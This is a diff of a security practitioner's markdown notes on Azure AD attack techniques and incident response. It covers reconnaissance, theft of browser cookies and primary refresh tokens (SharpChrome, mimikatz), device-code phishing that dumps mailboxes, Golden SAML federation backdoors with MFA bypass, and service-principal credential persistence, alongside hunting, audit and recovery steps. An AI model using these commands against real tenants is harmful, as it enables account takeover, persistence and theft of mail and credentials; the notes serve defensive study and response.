@@ -1,83 +1,193 @@
-# Azure AD Incident Response
+# Azure AD attack techniques and incident response
 
-Rough notes for understanding the difficult-to-detect techniques used by the Solarwinds actor used to gain long-term access to Microsoft cloud services. Also [an Azure AD reconnaissance tool](https://github.com/WillOram/AzureAD-incident-response/blob/main/azureadrecon.py) that uses Public APIs to help detect Azure AD tenants with modified federation settings. 
+Rough in-progress notes on Azure AD attack techniques, including techniques used by Nobelium to gain long-term access to targets cloud identities and data. 
 
-Four techniques: 
-
-__On-premise__
-* **Stealing ADFS token-signing certificates to move laterally to cloud environments and facilitate long-term access** - Stealing token-signing certificates from on-premises ADFS servers to forge SAML tokens - "Golden SAML" attack. Allow anyone with the certificate to impersonate any user to your cloud environment. 
-* **Modifying privileged users to cloud services (including their credentials) through account synchronization** - Setting passwords for accounts in privileged cloud groups. Adding accounts to privileged cloud groups. 
-
-__Cloud__
-* **Creating or modifying federation trusts to facilitate long-term access to cloud services** - adding new federation trusts to or modifying existing federation trusts to add new token-signing certificates, to forge SAML authentication tokens. These can either be configured in Azure AD with PowerShell management APIs, or configured on an ADFS server and synced with Azure AD. Allow anyone with the malicious addded certificate to impersonate any user to your cloud environment. 
-* **Creating or modifying service principals to provide long-term API-based access to cloud services** - adding credentials to existing service principals, adding new service principals with credentials, adding permissions to service principals and applications to access Microsoft Graph API. Allow anyone with the credential to access data via APIs from your cloud services. 
-
-__Third-party__
-* **Stealing the certificates used for service principals to provide long-term API-based access to cloud services** -- stealing certificates used to authenticate with service principals (see the attack against Mimecast)
-
-Example of how these techniques are used in practice: 
-
-Microsoft [four stages of an attack](https://us-cert.cisa.gov/ncas/alerts/aa21-008a) to go from priviliged on premises access to persistent access to data from cloud services. 
-* **Stage 1: Forging a trusted authentication token used to access resources that trust the on-premises identity provider** 
-  * Detection Method 1: Correlating service provider login events with corresponding authentication events in Active Directory Federation Services (ADFS) and Domain Controllers
-  * Detection Method 2: Identifying certificate export events in ADFS
-  * Detection Method 3: Customizing SAML response to identify irregular access
-  * Detection Method 4: Detecting malicious ADFS trust modification
-* **Stage 2: Using the forged authentication token to create configuration changes in the Azure AD (establishing a foothold)**
-* **Stage 3: Acquiring an OAuth access token for the application using the forged credentials added to an existing application or service principal and calling APIs with the permissions assigned to that application**
-* **Stage 4: Once access has been established, the threat actor Uses Microsoft Graph API to conduct action on objectives from an external RESTful API (queries impersonating existing applications)**
-
-- [Azure AD Incident Response](#azure-ad-incident-response)
-  * [Notes for simulating attacks in a lab](#notes-for-simulating-attacks-in-a-lab)
-    + [Exporting an ADFS certificate](#exporting-an-adfs-certificate)
-    + [Modifying an existing federation trust](#modifying-an-existing-federation-trust)
-    + [Adding a malicious federation trust](#adding-a-malicious-federation-trust)
-    + [Adding credentials to a service principle](#adding-credentials-to-a-service-principle)
-      - [Certificate](#certificate)
-      - [Password](#password)
-    + [Creating a new service principle](#creating-a-new-service-principle)
-  * [Auditing for backdoors](#auditing-for-backdoors)
+  * [Background reading on Azure AD and authentication](#background-reading-on-azure-ad-and-authentication)
+  * [Background reading on attack techniques](#background-reading-on-attack-techniques)
+  * [Background reading on attack techniques used in the SolarWinds related attacks](#background-reading-on-attack-techniques-used-in-the-solarwinds-related-attacks)
+  * [Quick references](#quick-references)
+  * [Reconnaissance against Azure AD tenants](#reconnaissance-against-azure-ad-tenants)
+  * [Authenticated reconnaissance against Azure AD](#authenticated-reconnaissance-against-azure-ad)
+  * [Using a compromised workstation to gain access to cloud identities and data](#using-a-compromised-workstation-to-gain-access-to-cloud-identities-and-data)
+    + [Stealing the persistent authentication cookie from a compromised workstation](#stealing-the-persistent-authentication-cookie-from-a-compromised-workstation)
+    + [Obtaining a refresh token from a compromised workstation](#obtaining-a-refresh-token-from-a-compromised-workstation)
+    + [Stealing the primary refresh token from a compromised workstation](#stealing-the-primary-refresh-token-from-a-compromised-workstation)
+    + [Dumping clear text credentials to authenticate to cloud services](#dumping-clear-text-credentials-to-authenticate-to-cloud-services)
+  * [Using a compromised AD domain to gain access to cloud identities and data](#using-a-compromised-ad-domain-to-gain-access-to-cloud-identities-and-data)
+    + [Stealing or modify token-signing certificates to perform a Golden SAML attack](#stealing-or-modify-token-signing-certificates-to-perform-a-golden-saml-attack)
+    + [Compromising the AZUREADSSOACC account to forge Kerberos tickets](#compromising-the-azureadssoacc-account-to-forge-kerberos-tickets)
+    + [Setting the password for an account in privileged cloud groups](#setting-the-password-for-an-account-in-privileged-cloud-groups)
+    + [Dumping clear text credentials to accounts in privileged cloud groups](#dumping-clear-text-credentials-to-accounts-in-privileged-cloud-groups)
+  * [Using a compromised cloud global admin account gain access to on-prem](#using-a-compromised-cloud-global-admin-account-gain-access-to-on-prem)
+  * [Using a compromised third-party to gain access to cloud identities and data](#using-a-compromised-third-party-to-gain-access-to-cloud-identities-and-data)
+  * [Using phishing attacks to gain access to cloud identities and data](#using-phishing-attacks-to-gain-access-to-cloud-identities-and-data)
+    + [Consent grant phishing attack](#consent-grant-phishing-attack)
+  * [Using password spraying to cloud accounts](#using-password-spraying-to-cloud-accounts)
+  * [Gaining persistent access to cloud identities and data](#gaining-persistent-access-to-cloud-identities-and-data)
+    + [Creating a new Service Principals to provide long-term API-based access](#creating-a-new-service-principals-to-provide-long-term-api-based-access)
+    + [Adding credentials to an existing new Service Principals to provide long-term API-based access](#adding-credentials-to-an-existing-new-service-principals-to-provide-long-term-api-based-access)
+    + [Configuring new or modifying existing federation trusts to perform Golden SAML attacks](#configuring-new-or-modifying-existing-federation-trusts-to-perform-golden-saml-attacks)
+    + [Joining a fake device to Azure AD](#joining-a-fake-device-to-azure-ad)
+    + [Dumping credentials for Azure resources](#dumping-credentials-for-azure-resources)
+    + [Modify conditional access to add in MFA trusted IPs](#modify-conditional-access-to-add-in-mfa-trusted-ips)
+  * [Pass the certificate](#pass-the-certificate)
+  * [Hunting for backdoors](#hunting-for-backdoors)
     + [Commands to manually audit federation trusts](#commands-to-manually-audit-federation-trusts)
     + [Commands to manually audit service principals](#commands-to-manually-audit-service-principals)
       - [Review service principals with credentials](#review-service-principals-with-credentials)
-      - [Review service principals with credentials and risky permissions](#review-service-principals-with-credentials-and-risky-permissions)
-  * [Detecting for the use of attacks](#detecting-for-the-use-of-attacks)
-    + [Use of token-signing certificates to spoof SAML tokens](#Use-of-token-signing-certificates-to-spoof-SAML-tokens)
-    + [Investigate suspect service principals](#investigate-suspect-service-principals)
-    + [Azure Sentinel data sources to configure](#azure-sentinel-data-sources-to-configure)
-    + [Other useful commands](#other-useful-commands)
-  * [Further references](#further-references)
+    + [Review service principals with credentials and risky permissions](#review-service-principals-with-credentials-and-risky-permissions)
+    + [Further hunting](#further-hunting)
+  * [Recovering a compromised Azure AD environment](#recovering-a-compromised-azure-ad-environment)
+  * [Azure Sentinel data sources to configure](#azure-sentinel-data-sources-to-configure)
+  * [Notes on building a lab](#notes-on-building-a-lab)
+
+<small><i><a href='http://ecotrust-canada.github.io/markdown-toc/'>Table of contents generated with markdown-toc</a></i></small>
 
 
-Background reading on defending against the threat: 
+## Background reading on Azure AD and authentication 
+
+* [Microsoft ITOps | OPS108: Windows authentication internals in a hybrid world](https://techcommunity.microsoft.com/t5/itops-talk-blog/ops108-windows-authentication-internals-in-a-hybrid-world/ba-p/2109557)
+* [Ignite | Deep-dive: Azure Active Directory Authentication and Single-Sign-On](https://channel9.msdn.com/Events/Ignite/Microsoft-Ignite-Orlando-2017/BRK3015)
+* [OAuth 2.0 and OpenID Connect](https://www.youtube.com/watch?v=996OiexHze0&ab_channel=OktaDev)
+* [Microsoft Identity Platform](https://docs.microsoft.com/en-us/azure/active-directory/develop/)
+* [Microsoft Identity Platform | Service principles and applications](https://docs.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals)
+* [Microsoft Identity Platform | OAuth2 Code flow](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow)
+* [Microsoft Identity Platform | What is a Primary Refresh Token?](https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token)
+* [Microsoft 365 internals explained | Microsoft Graph, substrate, and PowerShell with Jeffrey Snover](https://www.youtube.com/watch?v=uuiTR8r27Os&ab_channel=MicrosoftMechanics)
+* [Microsoft | Azure AD Authentication basics (6 videos)](https://www.youtube.com/watch?v=fbSVgC8nGz4&list=PLLasX02E8BPBm1xNMRdvP6GtA6otQUqp0&index=13&ab_channel=MicrosoftAzure)
+* [Overview of the Microsoft identity platform for developers](https://www.youtube.com/watch?v=zjezqZPPOfc)
+* [Detailed look at Windows Credentials](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication?WT.mc_id=modinfra-12977-socuff)
+* [Windows internals Version 7 Part 1 Chapter 7 Security](https://www.google.com/search?q=Windows+internals+Version+7+Part+1+Chapter+7&oq=Windows+internals+Version+7+Part+1+Chapter+7&aqs=chrome..69i57.211j0j4&sourceid=chrome&ie=UTF-8)
+
+## Background reading on attack techniques
+* [Attacking and Defending the Microsoft Cloud](https://adsecurity.org/wp-content/uploads/2019/08/2019-BlackHat-US-Metcalf-Morowczynski-AttackingAndDefendingTheMicrosoftCloud.pdf) [Video](https://www.youtube.com/watch?v=SG2ibjuzRJM&ab_channel=BlackHat)
+* [DEF CON 25 | Gerald Steere, Sean Metcalf - Hacking the Cloud](https://www.youtube.com/watch?v=LufXEPTlPak&ab_channel=DEFCONConference)
+* [TR19 | I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory](https://www.youtube.com/watch?v=JEIR5oGCwdg&ab_channel=TROOPERScon)
+* [PSCONFEU 2020 | Abusing Azure Active Directory: Who would you like to be today? - Nestori Syynimaa](https://www.youtube.com/watch?v=tJkjOnxcw6w&ab_channel=PowerShellConferenceEU)
+* [Blachhat 2020 | My Cloud is APTs Cloud: Attacking and Defending O365](https://i.blackhat.com/USA-20/Thursday/us-20-Bienstock-My-Cloud-Is-APTs-Cloud-Investigating-And-Defending-Office-365.pdf)
+* [BlueHat Seattle 2019 | I'm in your cloud: A year of hacking Azure AD](https://www.youtube.com/watch?v=fpUZJxFK72k&ab_channel=MicrosoftSecurityResponseCenter%28MSRC%29)
+* [AD Attack and Defense](https://github.com/infosecn1nja/AD-Attack-Defense)
+
+## Background reading on attack techniques used in the SolarWinds related attacks 
 * [Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments](https://us-cert.cisa.gov/ncas/alerts/aa21-008a)
 * [Microsoft technical blog on SolarWinds attacks](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)
 * [Microsoft blog on Azure Sentinel Post-Compromise Hunting](https://techcommunity.microsoft.com/t5/azure-sentinel/solarwinds-post-compromise-hunting-with-azure-sentinel/ba-p/1995095)
 * [Microsoft advice for incident responders](https://www.microsoft.com/security/blog/2020/12/21/advice-for-incident-responders-on-recovery-from-systemic-identity-compromises/)
 * [Microsoft blog on Identity IOCs](https://techcommunity.microsoft.com/t5/azure-active-directory-identity/understanding-quot-solorigate-quot-s-identity-iocs-for-identity/ba-p/2007610)
 
-## Notes for simulating attacks in a lab
+## Quick references 
 
-* Purchase a test domain name. 
-* Use Let's Encrypt to issue a wildcard certificate for the domain name. 
-* Configure an Azure AD tenant and configure the domain as a custom domain. 
-* Deploy three Windows Servers in Azure, and one test workstation. 
-* Setup one of the Windows Servers as a domain controller, use the same domain name as previously registered. 
-* Domain join all the other systems (after configuring the DC as the DNS server for the VNet). 
-* Use AD Connect to configure federation with Azure AD, including configuring the ADFS server and the WAP. 
-* Configure 443 access to the WAP from the internet.
-* Configure Azure Sentinel, onboard the security logs from all systems and the Azure AD audit logs. 
-* Configure the diagnostic settings for Azure AD to collect all logs data types. 
-* Enable audit logging in the Security & Compliance Center. 
-* Create and configure a test application in Azure AD, configure Mail.Read permissions. Use the web application quick-start to log-in test users to the app and require them to consent access to their data. 
-* Create and configure a test application in Azure AD, configure Mail.Read permissions. Grant [admin consent](https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/grant-admin-consent) to the applicaiton. 
+* [Microsoft portals](https://msportals.io/)
+* [Azure AD Red Team Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md)
+* [Decoding JWTs](https://jwt.ms/)
 
-### Exporting an ADFS certificate
+## Reconnaissance against Azure AD tenants
 
-PS> Export-AADIntADFSSigningCertificate -filename ADFSSigningCertificate.pfx  
+```
+https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration
+https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
+https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
+```
 
-Export the ADFS configuration for more information: 
+```
+PS> Get-AADIntLoginInformation -Domain <DOMAIN> 
+PS> Invoke-AADIntReconAsOutsider -DomainName <DOMAIN> | Format-Table
+```
 
+A python tool to look at [detailed federation information](https://github.com/WillOram/AzureAD-incident-response/blob/main/azureadrecon.py). 
+
+## Authenticated reconnaissance against Azure AD 
+
+```
+roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout]
+roadrecon gather
+roadrecon gui
+```
+
+## Using a compromised workstation to gain access to cloud identities and data 
+
+### Stealing the persistent authentication cookie from a compromised workstation
+
+Remote environment 
+
+```
+Copy-Item "$Env:localappdata\Google\Chrome\User Data\Default\Cookies" .\tmp\
+
+Add-Type -AssemblyName System.Security
+$localState = Get-Content "$Env:localappdata\Google\Chrome\User Data\Local State" | ConvertFrom-Json
+$encryptedKey = [convert]::FromBase64String($localState.os_crypt.encrypted_key)
+$chromeMasterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(($encryptedKey | Select-Object -Skip 5), $null, 'CurrentUser')
+[convert]::ToBase64String($chromeMasterKey) > .\tmp\chromeMasterKey
+```
+
+Local env
+
+```
+Function Convert-ByteArrayToHex {
+    [cmdletbinding()]
+    param(
+        [parameter(Mandatory=$true)]
+        [Byte[]]
+        $Bytes
+    )
+    $HexString = [System.Text.StringBuilder]::new($Bytes.Length * 2)
+    ForEach($byte in $Bytes){
+        $HexString.AppendFormat("{0:x2}", $byte) | Out-Null
+    }
+    $HexString.ToString()
+}
+
+$base64MasterKey = Get-Content .\chromeMasterKey
+$encryptedKey = Convert-ByteArrayToHex ([convert]::FromBase64String($base64MasterKey))
+$cookiePath = (Resolve-Path Cookies).Path 
+.\SharpChrome.exe  cookies /target:$cookiePath /statekey:$encryptedKey /cookie:"ESTSAUTHPERSISTENT" /format:json
+```
+
+### Obtaining a refresh token from a compromised workstation
+
+* [Background on browser SSO](https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token#browser-sso-using-prt)
+* [Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert](https://o365blog.com/post/prt/)
+* [Abusing Azure AD SSO with the Primary Refresh Token](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
+* [Digging further into the Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
+* [Requests AAD Refresh Token](https://github.com/leechristensen/RequestAADRefreshToken)
+
+Key steps (user context):
+* Request a PRT cookie and exchange for a (the PRT cookie expired after about 35 minutes)
+* Request a refresh and access token from a Public application using a OAuth2 authorization code flow (the refresh token is valid for 90 days by default)  
+
+### Stealing the primary refresh token from a compromised workstation 
+
+* [Pass the PRT](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/) 
+
+Key steps (local admin required):
+* Extract PRT from LSASS
+* Extract the Session Key and decrypt with DPAPI (TPM)
+* Create a PRT cookie and exchange for a session cookie 
+
+```
+dsregcmd.exe /status
+mimikatz.exe privilege::debug sekurlsa::cloudap
+token::elevate dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
+```
+
+### Dumping clear text credentials to authenticate to cloud services
+* Useful if domain account is a high-privilege cloud account
+* Enable WDigest with [Invoke-WdigestDowngrade.ps1](https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Invoke-WdigestDowngrade.ps1)
+* If MFA is required credentials could potentially be used through a proxy when Conditional Access policies not configured to require MFA from trusted locations 
+* Check [MFASweep](https://github.com/dafthack/MFASweep)
+
+## Using a compromised AD domain to gain access to cloud identities and data 
+
+### Stealing or modify token-signing certificates to perform a Golden SAML attack
+
+* Stealing token-signing certificates from on-premises ADFS servers to forge SAML tokens "Golden SAML" attack. 
+* Allows anyone with the certificate to impersonate any user to Azure AD. 
+* Can steal token-signing certificates to ADFS or add an alternative token-signing certificate
+* [Export Active Directory Federation Services (AD FS) Token Signing Certificate](https://github.com/Azure/SimuLand/blob/main/3_simulate_detect/credential-access/exportADFSTokenSigningCertificate.md)
+* [FireEye Azure AD backdoors](https://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html)
+
+Export ADFS configuration: 
+```
 PS> $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService  
 PS> $conn = $ADFS.ConfigurationDatabaseConnectionString  
 PS> $SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn  
@@ -89,55 +199,159 @@ PS> $SQLreader.Read() | Out-Null
 PS> $settings=$SQLreader.GetTextReader(0).ReadToEnd()  
 PS> $SQLreader.Dispose()  
 PS> \[xml\]$xml=$settings  
+```
+ADFSDump https://github.com/fireeye/ADFSDump
 
-You can also use ADFSDump https://github.com/fireeye/ADFSDump
+### Compromising the AZUREADSSOACC account to forge Kerberos tickets
 
-### Modifying an existing federation trust
+* [https://o365blog.com/post/on-prem_admin/](https://o365blog.com/post/on-prem_admin/)
+* Dump the hash for the account AZUREADSSOACC using dcsync or from NTDS.DIT
+* Forge Kerberos tickets for users synced with Azure AD 
 
+### Setting the password for an account in privileged cloud groups
 
+* Compromise Azure AD connector account (stored in a local configuration database)
+* [https://o365blog.com/post/on-prem_admin/](https://o365blog.com/post/on-prem_admin/)
+
+```
+$creds = Get-AADIntSyncCredentials
+Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
+Get-AADIntSyncObjects | Select UserPrincipalName,SourceAnchor,CloudAnchor | Sort UserPrincipalName
+Set-AADIntUserPassword ...
+```
+
+Using a compromised AD sync accounts [I'm in your cloud tenant](https://dirkjanm.io/assets/raw/Im%20in%20your%20cloud%20bluehat-v1.0.pdf)
+* Dump all on-premise password hashes (if PHS is enabled)
+• Log in on the Azure portal (since it’s a user)
+• Bypass conditional access policies for admin accounts
+• Add credentials to service principals
+• Modify service principals properties
+• Modify/backdoor/remove conditional access policies (internal API)
+
+### Dumping clear text credentials to accounts in privileged cloud groups
+* Credential dumping and lateral movement
+* DCsync / NTDTS etc. 
+* If MFA is required credentials could potentially be used through a proxy when Conditional Access policies not configured to require MFA from trusted locations 
+* Check [MFASweep](https://github.com/dafthack/MFASweep)
+
+## Using a compromised cloud global admin account gain access to on-prem 
+
+* [Death from above](https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d)
+
+## Using a compromised third-party to gain access to cloud identities and data 
+
+* Stealing the certificates used for service principals (see the attack against Mimecast)
+
+## Using phishing attacks to gain access to cloud identities and data 
+
+* [Introducing a new phishing technique for compromising Office 365 accounts](https://o365blog.com/post/phishing/)
+* [The art of the device code phish](https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html)
+* The user code is valid only for 15 minutes
+
+```
+> Get-AzureToken -Client Graph
+> RefreshTo-MSGraphToken -refreshToken $response.refresh_token -domain <DOMAIN> -Device iPhone -Browser Safari
+> Dump-OWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder inbox -top 1 -Device iPhone -Browser Safari
+```
+
+Uses Microsoft Office client id d3590ed6-52b3-4102-aeff-aad2292ab01c
+
+### Consent grant phishing attack
+
+* todo
+
+## Using password spraying to cloud accounts
+
+* [MSOLSpray](https://github.com/dafthack/MSOLSpray)
+
+## Gaining persistent access to cloud identities and data 
+
+### Creating a new Service Principals to provide long-term API-based access 
+
+```
+PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null}  
+PS> $sp = New-AzADServicePrincipal -DisplayName 'MicrosoftSyncShare'  
+PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
+```
+
+### Adding credentials to an existing new Service Principals to provide long-term API-based access
+
+```
+PS> $cert = New-SelfSignedCertificate -dnsname some.domain.com -CertStoreLocation cert:\LocalMachine\My -Provider “Microsoft Enhanced RSA and AES Cryptographic Provider”  
+PS> $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())   
+PS> $sp = get-azureadserviceprincipal -searchstring SEARCHSTRING  
+PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
+PS> Connect-AzureAD  -Tenant TENANTID -ApplicationID APPID -CertificateThumbprint CERTTHUMBPRINT  
+```
+
+Creates the Azure AD audit log event "Add service principal credentials"
+
+```
+PS> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "01-01-2030 12:00:00" -StartDate "04-04-2020 12:00:00"  -Value PASSWORD  
+```
+Creates the Azure AD audit log event "Add service principal credentials"
+
+### Configuring new or modifying existing federation trusts to perform Golden SAML attacks
+
+* Adding new federation trusts to or modifying existing federation trusts to add new token-signing certificates, to forge SAML authentication tokens
+
+```
+PS> Get-AADIntAccessTokenForAADGraph -savetocache                                                                       
+PS> ConvertTo-AADIntBackdoor -domain maliciousdomain.com     
+PS> get-msoluser | select UserPrincipalName, ImmutableId  
+PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer ISSUER  
+```
+Creates the Azure AD audit log event "Set domain authentication"
+
+```
 PS> Get-MSOLUser | Where-Object{$\_.DisplayName -eq 'Will'} | select UserPrincipalName, ImmutableId  
 PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select IssuerUri  
 PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
 PS> Set-MsolDomainFederationSettings -DomainName $domainname -NextSigningCertificate $malicious_cert  
 PS> Get-MsolDomainFederationSettings -DomainName $domainname | Select *  
 PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer $issueruri  
+```
 
 AuditLogs | where OperationName =~ "Set federation settings on domain"
 
-### Adding a malicious federation trust
+### Joining a fake device to Azure AD
 
-PS> Get-AADIntAccessTokenForAADGraph -savetocache                                                                       
-PS> ConvertTo-AADIntBackdoor -domain maliciousdomain.com     
-PS> get-msoluser | select UserPrincipalName, ImmutableId  
-PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer ISSUER  
+* [Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert](https://o365blog.com/post/prt/)
 
-Creates the Azure AD audit log event "Set domain authentication"
+```
+Join-AADIntDeviceToAzureAD -DeviceName "My computer" -DeviceType "Commodore" -OSVersion "C64"
+$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7.pfx
+```
 
-### Adding credentials to a service principle 
+### Dumping credentials for Azure resources
 
-#### Certificate 
+* [Microburst] (https://github.com/NetSPI/MicroBurst)
+* [Get-AzPassword](https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/)
+* [Azure PrivEsc](https://www.youtube.com/watch?v=OES9RU0WTH0&ab_channel=DEFCONConference)
 
-PS> $cert = New-SelfSignedCertificate -dnsname some.domain.com -CertStoreLocation cert:\LocalMachine\My -Provider “Microsoft Enhanced RSA and AES Cryptographic Provider”  
-PS> $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())   
-PS> $sp = get-azureadserviceprincipal -searchstring SEARCHSTRING  
-PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
-PS> Connect-AzureAD  -Tenant TENANTID -ApplicationID APPID -CertificateThumbprint CERTTHUMBPRINT  
+```
+Import-Module Microburst.psm1
+Get-AzurePasswords
+Get-AzurePasswords -Verbose | Out-GridView
+```
+### Modify conditional access to add in MFA trusted IPs
 
-Creates the Azure AD audit log event "Add service principal credentials"
-#### Password
+## Pass the certificate
 
-PS> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "01-01-2030 12:00:00" -StartDate "04-04-2020 12:00:00"  -Value PASSWORD  
+* [Azure AD Pass The Certificate](https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597)
 
-Creates the Azure AD audit log event "Add service principal credentials"
+## Hunting for backdoors 
 
-### Creating a new service principle 
+* Audit federation trusts
+* Audit service principal credentials, permissions and reply URLs
+* Audit conditional access rules 
+* Hunt for suspicious AD Sync account logons 
+* Hunt for modifications to conditional access rules 
+* Hunt for suspicious sign-ins by service principals (Using AADServicePrincipalSignInLogs logs. Requires additional configuration to be sent to Sentinel)
+* Hunt for service principals accessing users' mailboxes (MailItemsAccessed log is enabled by default for users that are assigned an Office 365 or Microsoft 365 E5 license or for organizations with a Microsoft 365 E5 Compliance add-on subscription. The MailItemsAccessed mailbox auditing action covers all mail protocols: POP, IMAP, MAPI, EWS, Exchange ActiveSync, and REST.)
 
-PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null}  
-PS> $sp = New-AzADServicePrincipal -DisplayName 'MicrosoftSyncShare'  
-PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
 
-## Auditing for backdoors 
-
+```
 PS> Install-module AzureADPreview -AllowClobber
 PS> Connect-AzureAD  
 
@@ -166,6 +380,7 @@ PS> Invoke-AzureHound
 PS> # Hawk
 PS> Install-module hawk
 PS> start-hawktenantinvestigation  
+```
 
 ### Commands to manually audit federation trusts
 
@@ -191,14 +406,17 @@ PS> Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo | select-obje
 
 #### Review service principals with credentials 
 
+```
 PS> Get-AzureADServicePrincipal  
 PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.KeyCredentials -ne $null} | Select *  
 PS> Get-AzureADServicePrincipal -all $true | Where-Object{$\_.PasswordCredentials -ne $null} | Select *   
+```
 
-#### Review service principals with credentials and risky permissions 
+### Review service principals with credentials and risky permissions 
 
 See scripts output in Sparrow and CRT tool.  
 
+```
 PS> # Get Service Principal using objectId  
 PS> $sp = Get-AzureADServicePrincipal -ObjectId "OBJECTID"    
 
@@ -218,6 +436,7 @@ PS> # Look up Microsoft Graph permissions
 PS> $GraphSP = Get-AzureADServicePrincipal -All $true | Where-Object {$\_.DisplayName -eq "Microsoft Graph"}    
 PS> $GraphAppRoles = $GraphSP.AppRoles | Select-Object -Property AllowedMemberTypes, Id, Value    
 PS> $GraphAppRoles| Where-Object {$\_.Id -eq "e2a3a72e-5f79-4c64-b1b1-878b674786c9" -or $\_.Id -eq "810c84a8-4a9e-49e6-bf7d-12d183f40d01"}    
+```
 
 App permissions reference https://docs.microsoft.com/en-us/graph/permissions-reference   
 
@@ -229,22 +448,37 @@ Microsoft blog references Mail.Read and Mail.ReadWrite
 
 Mimecast: Mimecast ask organisations to add an application/service principal to Azure AD and add a certificate to that service principal, allowing Mimecast to authenticate to it. They then ask organisations to assign that service principal the permissions __full_access_as_app__ to __Office 365 Exchange Online__. See: https://community.mimecast.com/s/article/Creating-an-Office-365-Association-for-Server-Connections-1061681132
 
-## Detecting for the use of attacks 
+### Further hunting 
 
-### Use of token-signing certificates to spoof SAML tokens
+* [Crowdstrike blog on hunting for modifications](https://www.crowdstrike.com/blog/crowdstrike-launches-free-tool-to-identify-and-help-mitigate-risks-in-azure-active-directory/) There is a good list in here of what to search for in Azure AD that goes further than the above including:
+  * Reviewing trust relationships with partners including IT consultants, vendors and resellers 
+  * Reviewing Azure AD allowed identity providers (SAML IDPs through direct federation or social logins)
+  * Reviewing Azure B2B external identities’ access to the Azure portal 
+  * Review environment for overly privileged service accounts that may have access to Azure  
+ 
+Use of token-signing certificates to spoof SAML tokens. Azure AD UserAuthenticationMethod: 16457 indicates a password with MFA was satisfied by a federated identity provider: https://twitter.com/ItsReallyNick/status/1349536271010574338?s=20
 
-Azure AD UserAuthenticationMethod: 16457 indicates a password with MFA was satisfied by a federated identity provider: https://twitter.com/ItsReallyNick/status/1349536271010574338?s=20
+## Recovering a compromised Azure AD environment 
 
-### Investigate suspect service principals
+* Reset all privileged accounts in Azure AD 
+* Invalidate refresh tokens issues for users (Revoke-AzureADUserAllRefreshToken)
+* Audit service principal credentials
+* Audit service principal permissions and reply URLs 
+* Audit federation settings and verified domains
+* Rotate the AD FS token-signing and token-decrypting certificates 
 
-** AADServicePrincipalSignInLogs **  
-* In preview for Azure AD. Requires additional configuration to be sent to Sentinel (on the Azure AD “Diagnostic Setting” page).   
+On-prem:
+* AZUREADSSOACC account 
+* On-premises AD DS connector account 
+* Azure AD connector account 
